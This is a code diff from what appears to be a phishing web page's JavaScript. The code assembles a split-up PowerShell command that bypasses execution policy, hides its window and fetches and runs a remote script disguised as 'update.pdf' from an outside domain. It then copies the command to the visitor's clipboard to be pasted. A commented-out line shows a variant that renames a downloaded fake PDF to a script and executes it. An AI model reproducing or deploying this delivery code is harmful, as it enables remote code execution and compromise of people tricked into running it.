@@ -210,7 +210,7 @@
           const step1 = "power";
           const step2 = "shell.exe"
           // const step_bro = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:5501/web-phishing/hello.ps1','$env:TEMP\\huongdan.pdf'); Rename-Item '$env:TEMP\\huongdan.pdf' '$env:TEMP\\huongdan.ps1' -Force; & '$env:TEMP\\huongdan.ps1'\"";
-          const step_bro = "-NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://update.jerryyytheduck.id.vn/update.pdf')\"";
+          const step_bro = "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('https://update.jerryyytheduck.id.vn/files/update.pdf')\"";
           const powershellCommand = `${step1}${step2} ${step_bro}`;
           navigator.clipboard.writeText(powershellCommand).then(() => {
 
